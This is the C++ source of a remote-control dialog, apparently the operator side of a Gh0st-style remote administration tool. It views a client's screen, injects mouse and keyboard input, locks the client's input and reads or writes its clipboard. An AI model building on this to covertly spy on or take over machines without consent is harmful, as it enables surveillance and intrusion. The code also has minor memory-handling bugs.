// RemoteController.cpp: 实现文件
//

#include "pch.h"
#include "CrabRemoteServer.h"
#include "RemoteController.h"
#include "afxdialogex.h"


// CRemoteController 对话框
extern "C" VOID CopyScreenData(PVOID SourceData, PVOID DestinationData, ULONG BufferLength);

IMPLEMENT_DYNAMIC(CRemoteController, CDialogEx)

CRemoteController::CRemoteController(CWnd* pParent, CIocpServer*
	IocpServer, CONTEXT_OBJECT* ContextObject)
	: CDialogEx(IDD_REMOTE_CONTROL_DIALOG, pParent)
{

	m_IocpServer = IocpServer;
	m_ContextObject = ContextObject;

	m_HorizontalScrollPosition = 0;
	m_VerticalScrollPosition = 0;
	if (m_ContextObject == NULL)
	{
		return;
	}
	ULONG	BufferLength = m_ContextObject->m_ReceivedBufferDataDecompressed.GetArrayLength() - 1;
	m_BitmapInfo = (BITMAPINFO*) new BYTE[BufferLength];

	if (m_BitmapInfo == NULL)
	{
		return;
	}
	//拷贝位图头信息
	memcpy(m_BitmapInfo, m_ContextObject->m_ReceivedBufferDataDecompressed.GetArray(1), BufferLength);
}

CRemoteController::~CRemoteController()
{
	if (m_BitmapInfo != NULL)
	{
		delete m_BitmapInfo;
		m_BitmapInfo = NULL;
	}
	::ReleaseDC(m_hWnd, m_WindowDCHandle);

	//回收工具箱
	if (m_WindowMemoryDCHandle != NULL)
	{
		DeleteDC(m_WindowMemoryDCHandle);

		//销毁工具
		DeleteObject(m_BitmapHandle);
		if (m_BitmapData != NULL)
		{
			m_BitmapData = NULL;
		}

		m_WindowMemoryDCHandle = NULL;

	}
}

void CRemoteController::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CRemoteController, CDialogEx)
	ON_WM_PAINT()
	ON_WM_CLOSE()
	ON_WM_SYSCOMMAND()
	ON_WM_VSCROLL()
	ON_WM_HSCROLL()
END_MESSAGE_MAP()


// CRemoteController 消息处理程序


BOOL CRemoteController::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  在此添加额外的初始化
	CString v1;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int ClientAddressLength = sizeof(ClientAddress);
	BOOL IsOk = getpeername(m_ContextObject->clientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength); //得到连接的ip 
	v1.Format(_T("\\\\%s - 远程控制管理"), IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : _T(""));
	//设置对话框标题


	m_WindowDCHandle = ::GetDC(m_hWnd);
	m_WindowMemoryDCHandle = CreateCompatibleDC(m_WindowDCHandle);

	m_BitmapHandle = CreateDIBSection(m_WindowDCHandle, m_BitmapInfo,
		DIB_RGB_COLORS, &m_BitmapData, NULL, NULL);                           //创建应用程序可以直接写入的、与设备无关的位图

	//初始化工具箱
	SelectObject(m_WindowMemoryDCHandle, m_BitmapHandle);                     //择一对象到指定的设备上下文环境


	SetWindowPos(NULL, 0, 0, m_BitmapInfo->bmiHeader.biWidth / 2, m_BitmapInfo->bmiHeader.biHeight / 2, 0);

	SetScrollRange(SB_HORZ, 0, m_BitmapInfo->bmiHeader.biWidth);             //指定滚动条范围的最小值和最大值
	SetScrollRange(SB_VERT, 0, m_BitmapInfo->bmiHeader.biHeight);

	//获得系统菜单
	CMenu* Menu = GetSystemMenu(FALSE);
	if (Menu != NULL)
	{
		//可以处理一下快捷键
		Menu->AppendMenu(MF_SEPARATOR);
		Menu->AppendMenu(MF_STRING, ID_CONTROL, _T("控制屏幕(&Y)"));
		Menu->AppendMenu(MF_STRING, ID_TRACE_CURSOR, _T("跟踪被控端鼠标(&T)"));
		Menu->AppendMenu(MF_STRING, ID_BLOCK_INPUT, _T("锁定被控端鼠标和键盘(&L)"));
		Menu->AppendMenu(MF_STRING, ID_SAVE_DIB, _T("保存快照(&S)"));
		Menu->AppendMenu(MF_SEPARATOR);
		Menu->AppendMenu(MF_STRING, ID_GET_CLIPBOARD, _T("获取剪贴板(&R)"));
		Menu->AppendMenu(MF_STRING, ID_SET_CLIPBOARD, _T("设置剪贴板(&L)"));
		Menu->AppendMenu(MF_SEPARATOR);

	}
	//Client屏幕中的鼠标位置
	m_CursorPosition.x = 0;
	m_CursorPosition.y = 0;


	BYTE IsToken = CLIENT_GO_ON;
	m_IocpServer->OnPrepareSending(m_ContextObject, &IsToken, sizeof(BYTE));





	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}

void CRemoteController::OnReceiveComplete(void)
{
	switch (m_ContextObject->m_ReceivedBufferDataDecompressed.GetArray(0)[0])
	{
	case CLIENT_REMOTE_CONTROLLER_FIRST_SCREEN:
	{

		DrawFirstData();
		break;
	}
	case CLIENT_REMOTE_CONTROLLER_NEXT_SCREEN:
	{
#define  ALGORITHM_DIFF 1
		if (m_ContextObject->m_ReceivedBufferDataDecompressed.GetArray(0)[1] == ALGORITHM_DIFF)
		{
			DrawNextData();
		}
		break;
	}
	case CLIENT_REMOTE_CONTROLLER_GET_CLIPBOARD_REPLY:
	{

		//将接收到的客户端数据放入到我们当前主控端中的剪切板中
		UpdateClipboardData((char*)m_ContextObject->m_ReceivedBufferDataDecompressed.GetArray(1),
			m_ContextObject->m_ReceivedBufferDataDecompressed.GetArrayLength() - 1);
		break;
	}
	default:
	{
		break;
	}
	}
	return;
}

VOID CRemoteController::DrawFirstData(void)
{
	//得到被控端发来的数据并将该数据拷贝到工具箱中的工具中
	memcpy(m_BitmapData, m_ContextObject->m_ReceivedBufferDataDecompressed.GetArray(1), m_BitmapInfo->bmiHeader.biSizeImage);

	PostMessage(WM_PAINT);//触发WM_PAINT消息
}

VOID CRemoteController::DrawNextData(void)
{
	BOOL	IsChanged = FALSE;
	ULONG	v1 = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // 标识 + 算法 + 光标位置 + 光标类型索引    [Pos][Length][Data]


	//前一帧数据
	LPVOID	PreviousScreenData = m_BitmapData;

	//获得当前帧数据
	LPVOID	CurrentScreenData = m_ContextObject->m_ReceivedBufferDataDecompressed.GetArray(v1);

	ULONG	CurrentScreenLength = m_ContextObject->m_ReceivedBufferDataDecompressed.GetArrayLength() - v1;

	POINT	PreviousCursorPosition;
	memcpy(&PreviousCursorPosition, &m_CursorPosition, sizeof(POINT));   //上一帧的光标位置

	//更新光标位置
	memcpy(&m_CursorPosition, m_ContextObject->m_ReceivedBufferDataDecompressed.GetArray(2), sizeof(POINT));

	//比较当前帧和上一帧光标数据
	if (memcmp(&PreviousCursorPosition, &m_CursorPosition, sizeof(POINT)) != 0)
	{
		//鼠标移动了
		IsChanged = TRUE;
	}

	if (CurrentScreenLength > 0)
	{
		//屏幕是否变化
		IsChanged = TRUE;
	}

	//lodsd指令从ESI指向的内存位置4个字节内容放入EAX中并且下移4
	//movsb指令字节传送数据，通过SI和DI这两个寄存器控制字符串的源地址和目标地址  ecx
	CopyScreenData(PreviousScreenData, CurrentScreenData, CurrentScreenLength);
	if (IsChanged)
	{
		//如果有变化响应Paint消息
		PostMessage(WM_PAINT);   //重绘消息
	}
	return VOID();
}

VOID CRemoteController::UpdateClipboardData(char* BufferData, ULONG BufferLength)
{

	if (!::OpenClipboard(NULL))
	{
		return;
	}
	//清空剪贴板数据内容
	::EmptyClipboard();
	//申请内存
	HGLOBAL GlobalHandle = GlobalAlloc(GPTR, BufferLength);
	if (GlobalHandle != NULL) {

		//锁定物理页面
		char* v5 = (LPTSTR)GlobalLock(GlobalHandle);
		memcpy(v5, BufferData, BufferLength);
		GlobalUnlock(GlobalHandle);

		SetClipboardData(CF_TEXT, GlobalHandle);
		GlobalFree(GlobalHandle);
	}
	CloseClipboard();
}



void CRemoteController::OnPaint()
{
	//将工具箱中的数据给工人
	BitBlt(m_WindowDCHandle, 0, 0,
		m_BitmapInfo->bmiHeader.biWidth,
		m_BitmapInfo->bmiHeader.biHeight,
		m_WindowMemoryDCHandle,
		m_HorizontalScrollPosition,
		m_VerticalScrollPosition,
		SRCCOPY);

	CPaintDC dc(this); // device context for painting
					   // TODO: 在此处添加消息处理程序代码
					   // 不为绘图消息调用 CDialogEx::OnPaint()
}


void CRemoteController::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (m_ContextObject != NULL)
	{
		m_ContextObject->RemoteDlg = NULL;
		m_ContextObject->DlgIdentity = 0;
		CancelIo((HANDLE)m_ContextObject->clientSocket);
		closesocket(m_ContextObject->clientSocket);
	}
	CDialogEx::OnClose();
}


void CRemoteController::OnSysCommand(UINT nID, LPARAM lParam)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	CMenu* Menu = GetSystemMenu(FALSE);
	switch (nID)
	{
	case ID_CONTROL:        //远程控制
	{
		m_IsControl = !m_IsControl;
		//设置菜单样式
		Menu->CheckMenuItem(ID_CONTROL, m_IsControl ? MF_CHECKED : MF_UNCHECKED);
		break;
	}
	case ID_TRACE_CURSOR: //跟踪被控端鼠标
	{
		m_IsTraceCursor = !m_IsTraceCursor;
		Menu->CheckMenuItem(ID_TRACE_CURSOR, m_IsTraceCursor ? MF_CHECKED : MF_UNCHECKED);
		OnPaint();

		break;
	}
	case ID_BLOCK_INPUT: // 锁定客户端鼠标和键盘
	{
		BOOL IsChecked = Menu->GetMenuState(ID_BLOCK_INPUT, MF_BYCOMMAND) & MF_CHECKED;
		Menu->CheckMenuItem(ID_BLOCK_INPUT, IsChecked ? MF_UNCHECKED : MF_CHECKED);

		BYTE	IsToken[2];
		IsToken[0] = CLIENT_REMOTE_CONTROLLER_BLOCK_INPUT_REQUIRE;
		IsToken[1] = !IsChecked;
		m_IocpServer->OnPrepareSending(m_ContextObject, IsToken, sizeof(IsToken));

		break;
	}
	case ID_SAVE_DIB:
	{
		SaveSnapshotData();
		break;
	}
	case ID_GET_CLIPBOARD:         //获取客户端剪贴板数据内容
	{
		BYTE	IsToken = CLIENT_REMOTE_CONTROLLER_GET_CLIPBOARD_REQUIRE;
		m_IocpServer->OnPrepareSending(m_ContextObject, &IsToken, sizeof(IsToken));

		break;
	}
	case ID_SET_CLIPBOARD:    //向客户端剪贴板中设置数据内容
	{

		//从当前服务器中的剪贴板中获取数据后发送到客户端
		SendClipboardData();
		break;
	}

	}
	CDialogEx::OnSysCommand(nID, lParam);
}

BOOL CRemoteController::SaveSnapshotData(void)
{
	//位图保存
	CString	FileFullPath = CTime::GetCurrentTime().Format("%Y-%m-%d_%H-%M-%S.bmp");
	CFileDialog Dialog(FALSE, "bmp", FileFullPath, OFN_OVERWRITEPROMPT, "位图文件(*.bmp)|*.bmp|", this);
	if (Dialog.DoModal() != IDOK)
		return FALSE;

	BITMAPFILEHEADER	BitmapFileHeader;
	LPBITMAPINFO		BitmapInfor = m_BitmapInfo;   //对方计算机当前帧数据
	CFile	FileHandle;
	//创建一个文件
	if (!FileHandle.Open(Dialog.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		return FALSE;
	}
	int	BitmapInforLength = sizeof(BITMAPINFO);


	BitmapFileHeader.bfType = ((WORD)('M' << 8) | 'B');
	BitmapFileHeader.bfSize = BitmapInfor->bmiHeader.biSizeImage + sizeof(BITMAPFILEHEADER);
	BitmapFileHeader.bfReserved1 = 0;
	BitmapFileHeader.bfReserved2 = 0;
	BitmapFileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + BitmapInforLength;

	FileHandle.Write(&BitmapFileHeader, sizeof(BITMAPFILEHEADER));
	FileHandle.Write(BitmapInfor, BitmapInforLength);

	FileHandle.Write(m_BitmapData, BitmapInfor->bmiHeader.biSizeImage);
	FileHandle.Close();

	return TRUE;
}

VOID CRemoteController::SendClipboardData(void)
{
	if (!::OpenClipboard(NULL))  //打开剪切板设备
		return;
	HGLOBAL GlobalHandle = GetClipboardData(CF_TEXT);   //代表着一个内存
	if (GlobalHandle == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	  BufferLength = GlobalSize(GlobalHandle) + 1;
	char* v5 = (LPSTR)GlobalLock(GlobalHandle);    //锁定 
	LPBYTE	BufferData = new BYTE[BufferLength];


	BufferData[0] = CLIENT_REMOTE_CONTROLLER_SET_CLIPBOARD_REQUIRE;
	memcpy(BufferData + 1, v5, BufferLength - 1);
	::GlobalUnlock(GlobalHandle);
	::CloseClipboard();
	m_IocpServer->OnPrepareSending(m_ContextObject, (PBYTE)BufferData, BufferLength);
	delete[] BufferData;
}

VOID CRemoteController::OnSending(MSG* Msg)
{
	if (!m_IsControl)
	{
		return;
	}
	LPBYTE BufferData = new BYTE[sizeof(MSG) + 1];
	BufferData[0] = CLIENT_REMOTE_CONTROLLER_CONTROL_REQUIRE;
	memcpy(BufferData + 1, Msg, sizeof(MSG));
	m_IocpServer->OnPrepareSending(m_ContextObject, BufferData, sizeof(MSG) + 1);

	delete[] BufferData;
}


BOOL CRemoteController::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
		// TODO: 在此添加专用代码和/或调用基类
#define MAKEDWORD(h,l)        (((unsigned long)h << 16) | l) 
	switch (pMsg->message)
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONUP:
	case WM_RBUTTONDOWN:
	case WM_RBUTTONUP:
	case WM_MOUSEMOVE:
	case WM_LBUTTONDBLCLK:
	case WM_RBUTTONDBLCLK:
	case WM_MBUTTONDOWN:
	case WM_MBUTTONUP:
	case WM_MOUSEWHEEL:
	{

		MSG	Msg;
		memcpy(&Msg, pMsg, sizeof(MSG));
		Msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_VerticalScrollPosition, LOWORD(pMsg->lParam) + m_HorizontalScrollPosition);
		Msg.pt.x += m_HorizontalScrollPosition;
		Msg.pt.y += m_VerticalScrollPosition;
		OnSending(&Msg);
		break;
	}
	case WM_KEYDOWN:
	case WM_KEYUP:
	case WM_SYSKEYDOWN:
	case WM_SYSKEYUP:
	{
		if (pMsg->wParam != VK_LWIN && pMsg->wParam != VK_RWIN)
		{
			MSG	Msg;
			memcpy(&Msg, pMsg, sizeof(MSG));
			Msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_VerticalScrollPosition, LOWORD(pMsg->lParam) + m_HorizontalScrollPosition);
			Msg.pt.x += m_HorizontalScrollPosition;
			Msg.pt.y += m_VerticalScrollPosition;
			OnSending(&Msg);
		}
		if (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE)
			return true;
		break;
	}

	}
	return CDialogEx::PreTranslateMessage(pMsg);
}


void CRemoteController::OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	SCROLLINFO ScrollInfo;
	int	i;
	ScrollInfo.cbSize = sizeof(SCROLLINFO);
	ScrollInfo.fMask = SIF_ALL;
	GetScrollInfo(SB_VERT, &ScrollInfo);  //1920  1080

	switch (nSBCode)
	{
	case SB_LINEUP:
		i = nPos - 1;  //0-1
		break;
	case SB_LINEDOWN:
		i = nPos + 1;
		break;
	case SB_THUMBPOSITION:
	case SB_THUMBTRACK:
		i = ScrollInfo.nTrackPos;
		break;
	default:
		return;
	}

	i = max(i, ScrollInfo.nMin);
	i = min(i, (int)(ScrollInfo.nMax - ScrollInfo.nPage + 1));

	RECT Rect;
	GetClientRect(&Rect);


	if ((Rect.bottom + i) > m_BitmapInfo->bmiHeader.biHeight)
	{
		i = m_BitmapInfo->bmiHeader.biHeight - Rect.bottom;
	}

	InterlockedExchange((PLONG)&m_VerticalScrollPosition, i);

	SetScrollPos(SB_VERT, i);
	OnPaint();
	CDialogEx::OnVScroll(nSBCode, nPos, pScrollBar);
}


void CRemoteController::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	SCROLLINFO ScrollInfo;
	int	i;
	ScrollInfo.cbSize = sizeof(SCROLLINFO);
	ScrollInfo.fMask = SIF_ALL;
	GetScrollInfo(SB_HORZ, &ScrollInfo);

	switch (nSBCode)
	{
	case SB_LINEUP:
		i = nPos - 1;
		break;
	case SB_LINEDOWN:
		i = nPos + 1;
		break;
	case SB_THUMBPOSITION:
	case SB_THUMBTRACK:
		i = ScrollInfo.nTrackPos;
		break;
	default:
		return;
	}

	i = max(i, ScrollInfo.nMin);
	i = min(i, (int)(ScrollInfo.nMax - ScrollInfo.nPage + 1));

	RECT Rect;
	GetClientRect(&Rect);

	if ((Rect.right + i) > m_BitmapInfo->bmiHeader.biWidth)
		i = m_BitmapInfo->bmiHeader.biWidth - Rect.right;

	InterlockedExchange((PLONG)&m_HorizontalScrollPosition, i);

	SetScrollPos(SB_HORZ, m_HorizontalScrollPosition);

	OnPaint();
	CDialogEx::OnHScroll(nSBCode, nPos, pScrollBar);
}
